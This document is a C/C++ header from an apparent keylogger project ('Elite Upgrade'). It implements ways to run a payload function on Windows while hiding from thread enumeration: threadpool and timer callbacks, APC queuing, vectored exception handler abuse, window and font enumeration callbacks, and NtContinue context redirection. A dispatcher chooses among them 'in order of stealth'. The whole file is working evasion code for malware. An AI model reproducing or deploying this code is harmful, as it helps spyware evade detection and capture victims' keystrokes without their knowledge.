/*
 * Callback-Based Execution Header
 * Execute code without creating visible threads
 * 
 * Features:
 * - ThreadPool callbacks
 * - APC injection
 * - Vectored Exception Handler abuse
 * - NtContinue gadgets
 * - EnumWindows/EnumFonts callbacks
 * 
 * These methods hide our execution from thread enumeration
 * 
 * Advanced Keylogger Project - Elite Upgrade
 */

#ifndef CALLBACKS_H
#define CALLBACKS_H

#include <windows.h>
#include <winternl.h>
#include <tp.h>

// ==================== NATIVE API DEFINITIONS ====================

typedef NTSTATUS(NTAPI* pNtQueueApcThread)(
    HANDLE ThreadHandle,
    PVOID ApcRoutine,
    PVOID ApcContext,
    PVOID ApcArgument1,
    PVOID ApcArgument2
);

typedef NTSTATUS(NTAPI* pNtTestAlert)(void);

typedef NTSTATUS(NTAPI* pNtContinue)(
    PCONTEXT ContextRecord,
    BOOLEAN RaiseAlert
);

typedef NTSTATUS(NTAPI* pRtlCreateUserThread)(
    HANDLE ProcessHandle,
    PSECURITY_DESCRIPTOR SecurityDescriptor,
    BOOLEAN CreateSuspended,
    ULONG StackZeroBits,
    PULONG StackReserved,
    PULONG StackCommit,
    PVOID StartAddress,
    PVOID StartParameter,
    PHANDLE ThreadHandle,
    PVOID ClientId
);

// ThreadPool work callback
typedef VOID(NTAPI* PTP_WORK_CALLBACK)(
    PTP_CALLBACK_INSTANCE Instance,
    PVOID Context,
    PTP_WORK Work
);

// ThreadPool timer callback  
typedef VOID(NTAPI* PTP_TIMER_CALLBACK)(
    PTP_CALLBACK_INSTANCE Instance,
    PVOID Context,
    PTP_TIMER Timer
);

// ==================== CALLBACK CONTEXT ====================

typedef struct _CALLBACK_CONTEXT {
    PVOID pFunction;
    PVOID pArg;
    PVOID pResult;
    HANDLE hEvent;
    BOOL bComplete;
    DWORD dwError;
} CALLBACK_CONTEXT, *PCALLBACK_CONTEXT;

// ==================== THREADPOOL EXECUTION ====================
/*
 * Execute via Windows ThreadPool
 * Advantages:
 * - No direct thread creation
 * - Call stack shows system threadpool code
 * - Built-in thread management
 */

static VOID CALLBACK TpWorkCallback(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work) {
    PCALLBACK_CONTEXT pCtx = (PCALLBACK_CONTEXT)Context;
    
    if (pCtx && pCtx->pFunction) {
        typedef PVOID(*PayloadFunc)(PVOID);
        PayloadFunc fn = (PayloadFunc)pCtx->pFunction;
        pCtx->pResult = fn(pCtx->pArg);
        pCtx->bComplete = TRUE;
        
        if (pCtx->hEvent) {
            SetEvent(pCtx->hEvent);
        }
    }
}

inline PVOID ExecuteViaThreadPool(PVOID pFunction, PVOID pArg, DWORD dwTimeout = INFINITE) {
    CALLBACK_CONTEXT ctx = { 0 };
    ctx.pFunction = pFunction;
    ctx.pArg = pArg;
    ctx.pResult = NULL;
    ctx.hEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
    ctx.bComplete = FALSE;
    
    if (!ctx.hEvent) return NULL;
    
    // Create work item
    PTP_WORK work = CreateThreadpoolWork(TpWorkCallback, &ctx, NULL);
    if (!work) {
        CloseHandle(ctx.hEvent);
        return NULL;
    }
    
    // Submit work
    SubmitThreadpoolWork(work);
    
    // Wait for completion
    WaitForSingleObject(ctx.hEvent, dwTimeout);
    
    // Cleanup
    WaitForThreadpoolWorkCallbacks(work, FALSE);
    CloseThreadpoolWork(work);
    CloseHandle(ctx.hEvent);
    
    return ctx.pResult;
}

// ==================== TIMER-BASED EXECUTION ====================

static VOID CALLBACK TpTimerCallback(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_TIMER Timer) {
    PCALLBACK_CONTEXT pCtx = (PCALLBACK_CONTEXT)Context;
    
    if (pCtx && pCtx->pFunction) {
        typedef PVOID(*PayloadFunc)(PVOID);
        PayloadFunc fn = (PayloadFunc)pCtx->pFunction;
        pCtx->pResult = fn(pCtx->pArg);
        pCtx->bComplete = TRUE;
        
        if (pCtx->hEvent) {
            SetEvent(pCtx->hEvent);
        }
    }
}

inline PVOID ExecuteViaPoolTimer(PVOID pFunction, PVOID pArg, DWORD dwDelayMs = 0) {
    CALLBACK_CONTEXT ctx = { 0 };
    ctx.pFunction = pFunction;
    ctx.pArg = pArg;
    ctx.pResult = NULL;
    ctx.hEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
    ctx.bComplete = FALSE;
    
    if (!ctx.hEvent) return NULL;
    
    // Create timer
    PTP_TIMER timer = CreateThreadpoolTimer(TpTimerCallback, &ctx, NULL);
    if (!timer) {
        CloseHandle(ctx.hEvent);
        return NULL;
    }
    
    // Set timer (negative = relative time in 100ns units)
    FILETIME ft;
    ULARGE_INTEGER dueTime;
    dueTime.QuadPart = -((LONGLONG)dwDelayMs * 10000);
    ft.dwLowDateTime = dueTime.LowPart;
    ft.dwHighDateTime = dueTime.HighPart;
    
    SetThreadpoolTimer(timer, &ft, 0, 0);
    
    // Wait
    WaitForSingleObject(ctx.hEvent, INFINITE);
    
    // Cleanup
    WaitForThreadpoolTimerCallbacks(timer, FALSE);
    CloseThreadpoolTimer(timer);
    CloseHandle(ctx.hEvent);
    
    return ctx.pResult;
}

// ==================== APC INJECTION ====================
/*
 * Queue APC to current thread and trigger with NtTestAlert
 * No new thread creation required
 */

inline BOOL ExecuteViaAPC(PVOID pFunction, PVOID pArg) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;
    
    pNtQueueApcThread NtQueueApcThread = 
        (pNtQueueApcThread)GetProcAddress(hNtdll, "NtQueueApcThread");
    pNtTestAlert NtTestAlert = 
        (pNtTestAlert)GetProcAddress(hNtdll, "NtTestAlert");
    
    if (!NtQueueApcThread || !NtTestAlert) return FALSE;
    
    HANDLE hThread = GetCurrentThread();
    
    // Queue APC to current thread
    NTSTATUS status = NtQueueApcThread(hThread, pFunction, pArg, NULL, NULL);
    
    if (status != 0) return FALSE;
    
    // Trigger APC execution
    NtTestAlert();
    
    return TRUE;
}

// ==================== VECTORED EXCEPTION HANDLER ====================
/*
 * Install VEH and trigger exception to execute code
 * Very stealthy - looks like exception handling
 */

static CALLBACK_CONTEXT g_VehContext = { 0 };

static LONG CALLBACK VehHandler(PEXCEPTION_POINTERS pExceptionInfo) {
    // Check if this is our deliberate exception
    if (pExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_BREAKPOINT) {
        if (g_VehContext.pFunction) {
            // Execute our code
            typedef PVOID(*PayloadFunc)(PVOID);
            PayloadFunc fn = (PayloadFunc)g_VehContext.pFunction;
            g_VehContext.pResult = fn(g_VehContext.pArg);
            g_VehContext.bComplete = TRUE;
            
            // Skip the breakpoint instruction
#ifdef _WIN64
            pExceptionInfo->ContextRecord->Rip++;
#else
            pExceptionInfo->ContextRecord->Eip++;
#endif
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    
    return EXCEPTION_CONTINUE_SEARCH;
}

inline PVOID ExecuteViaVEH(PVOID pFunction, PVOID pArg) {
    g_VehContext.pFunction = pFunction;
    g_VehContext.pArg = pArg;
    g_VehContext.pResult = NULL;
    g_VehContext.bComplete = FALSE;
    
    // Install VEH
    PVOID handler = AddVectoredExceptionHandler(1, VehHandler);
    if (!handler) return NULL;
    
    // Trigger breakpoint exception
    __try {
        __debugbreak();
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {
        // Fallback if VEH didn't handle it
    }
    
    // Remove handler
    RemoveVectoredExceptionHandler(handler);
    
    return g_VehContext.pResult;
}

// ==================== CALLBACK ENUMERATION ====================
/*
 * Use Windows enumeration functions that take callbacks
 * EnumWindows, EnumFonts, EnumDesktops, etc.
 */

static CALLBACK_CONTEXT g_EnumContext = { 0 };

static BOOL CALLBACK EnumWindowsCallback(HWND hwnd, LPARAM lParam) {
    // Only execute on first call
    static BOOL executed = FALSE;
    
    if (!executed && g_EnumContext.pFunction) {
        executed = TRUE;
        
        typedef PVOID(*PayloadFunc)(PVOID);
        PayloadFunc fn = (PayloadFunc)g_EnumContext.pFunction;
        g_EnumContext.pResult = fn(g_EnumContext.pArg);
        g_EnumContext.bComplete = TRUE;
        
        return FALSE;  // Stop enumeration
    }
    
    return TRUE;  // Continue (won't reach here after first)
}

inline PVOID ExecuteViaEnumWindows(PVOID pFunction, PVOID pArg) {
    g_EnumContext.pFunction = pFunction;
    g_EnumContext.pArg = pArg;
    g_EnumContext.pResult = NULL;
    g_EnumContext.bComplete = FALSE;
    
    EnumWindows(EnumWindowsCallback, 0);
    
    return g_EnumContext.pResult;
}

// EnumFonts version
static int CALLBACK EnumFontsCallback(
    const LOGFONTA* lpelfe,
    const TEXTMETRICA* lpntme,
    DWORD FontType,
    LPARAM lParam
) {
    static BOOL executed = FALSE;
    
    if (!executed && g_EnumContext.pFunction) {
        executed = TRUE;
        
        typedef PVOID(*PayloadFunc)(PVOID);
        PayloadFunc fn = (PayloadFunc)g_EnumContext.pFunction;
        g_EnumContext.pResult = fn(g_EnumContext.pArg);
        g_EnumContext.bComplete = TRUE;
        
        return 0;  // Stop enumeration
    }
    
    return 1;  // Continue
}

inline PVOID ExecuteViaEnumFonts(PVOID pFunction, PVOID pArg) {
    g_EnumContext.pFunction = pFunction;
    g_EnumContext.pArg = pArg;
    g_EnumContext.pResult = NULL;
    g_EnumContext.bComplete = FALSE;
    
    HDC hdc = GetDC(NULL);
    if (!hdc) return NULL;
    
    EnumFontsA(hdc, NULL, EnumFontsCallback, 0);
    
    ReleaseDC(NULL, hdc);
    
    return g_EnumContext.pResult;
}

// ==================== NTCONTINUE EXECUTION ====================
/*
 * Use NtContinue to transfer execution
 * Sets up context and continues execution at target
 */

inline BOOL ExecuteViaNtContinue(PVOID pFunction, PVOID pArg) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;
    
    pNtContinue NtContinue = (pNtContinue)GetProcAddress(hNtdll, "NtContinue");
    if (!NtContinue) return FALSE;
    
    // Capture current context
    CONTEXT ctx;
    RtlCaptureContext(&ctx);
    
    // Modify to point to our function
    // This is tricky - we need to set up proper calling convention
#ifdef _WIN64
    ctx.Rip = (DWORD64)pFunction;
    ctx.Rcx = (DWORD64)pArg;  // First argument
#else
    ctx.Eip = (DWORD)pFunction;
    // Push arg onto stack
    ctx.Esp -= sizeof(PVOID);
    *(PVOID*)ctx.Esp = pArg;
#endif
    
    // Continue at new context
    NtContinue(&ctx, FALSE);
    
    // Won't reach here
    return TRUE;
}

// ==================== WAITABLE TIMER EXECUTION ====================
/*
 * Execute via waitable timer APC
 * Timer completion routine runs our code
 */

static VOID CALLBACK TimerAPCProc(
    LPVOID lpArgToCompletionRoutine,
    DWORD dwTimerLowValue,
    DWORD dwTimerHighValue
) {
    PCALLBACK_CONTEXT pCtx = (PCALLBACK_CONTEXT)lpArgToCompletionRoutine;
    
    if (pCtx && pCtx->pFunction) {
        typedef PVOID(*PayloadFunc)(PVOID);
        PayloadFunc fn = (PayloadFunc)pCtx->pFunction;
        pCtx->pResult = fn(pCtx->pArg);
        pCtx->bComplete = TRUE;
        
        if (pCtx->hEvent) {
            SetEvent(pCtx->hEvent);
        }
    }
}

inline PVOID ExecuteViaWaitableTimer(PVOID pFunction, PVOID pArg) {
    CALLBACK_CONTEXT ctx = { 0 };
    ctx.pFunction = pFunction;
    ctx.pArg = pArg;
    ctx.pResult = NULL;
    ctx.bComplete = FALSE;
    
    // Create timer
    HANDLE hTimer = CreateWaitableTimerA(NULL, TRUE, NULL);
    if (!hTimer) return NULL;
    
    // Set timer (fire immediately)
    LARGE_INTEGER dueTime;
    dueTime.QuadPart = 0;  // Immediate
    
    if (!SetWaitableTimer(hTimer, &dueTime, 0, TimerAPCProc, &ctx, FALSE)) {
        CloseHandle(hTimer);
        return NULL;
    }
    
    // Wait in alertable state to trigger APC
    SleepEx(INFINITE, TRUE);
    
    CloseHandle(hTimer);
    return ctx.pResult;
}

// ==================== MASTER EXECUTION FUNCTION ====================
/*
 * Try multiple execution methods in order of stealth
 */

typedef enum _EXEC_METHOD {
    EXEC_THREADPOOL,
    EXEC_TIMER,
    EXEC_APC,
    EXEC_VEH,
    EXEC_WAITABLE_TIMER,
    EXEC_ENUM_WINDOWS,
    EXEC_DIRECT
} EXEC_METHOD;

inline PVOID ExecuteStealthy(PVOID pFunction, PVOID pArg, EXEC_METHOD method = EXEC_THREADPOOL) {
    switch (method) {
        case EXEC_THREADPOOL:
            return ExecuteViaThreadPool(pFunction, pArg);
            
        case EXEC_TIMER:
            return ExecuteViaPoolTimer(pFunction, pArg, 0);
            
        case EXEC_APC:
            ExecuteViaAPC(pFunction, pArg);
            return NULL;  // APC doesn't return value
            
        case EXEC_VEH:
            return ExecuteViaVEH(pFunction, pArg);
            
        case EXEC_WAITABLE_TIMER:
            return ExecuteViaWaitableTimer(pFunction, pArg);
            
        case EXEC_ENUM_WINDOWS:
            return ExecuteViaEnumWindows(pFunction, pArg);
            
        case EXEC_DIRECT:
        default: {
            typedef PVOID(*PayloadFunc)(PVOID);
            PayloadFunc fn = (PayloadFunc)pFunction;
            return fn(pArg);
        }
    }
}

#endif // CALLBACKS_H
